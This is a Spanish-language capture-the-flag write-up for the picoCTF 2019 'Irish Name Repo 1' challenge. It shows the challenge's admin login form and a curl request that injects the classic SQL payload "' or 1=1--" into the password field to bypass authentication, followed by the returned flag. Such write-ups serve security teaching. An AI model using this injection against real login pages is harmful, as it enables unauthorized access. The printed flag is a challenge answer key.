#### Descripción

Hay un sitio web que se ejecuta en ([enlace](https://jupiter.challenges.picoctf.org/problem/50009/)) o http://jupiter.challenges.picoctf.org:50009. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!`https://jupiter.challenges.picoctf.org/problem/50009/`

## Solución:

[](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Irish-Name-Repo_1.md#solution)

El sitio web ofrecía una página de inicio de sesión de administrador:

```html
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

Para eludir la lógica de autenticación, todo lo que necesitábamos hacer era proporcionar una cadena SQLi clásica:

```shell
dayan@Day MINGW64 ~ (master)
$ curl "https://jupiter.challenges.picoctf.org/problem/50009/login.php" --data "username=admin&password='+or+1=1--" && echo
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   100    0    66  100    34     12      6  0:00:05  0:00:05 --:--:--    22<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>

```

**Respuesta en el formato del concurso:** 
`picoCTF{s0m3_SQL_fb3fe2ad}`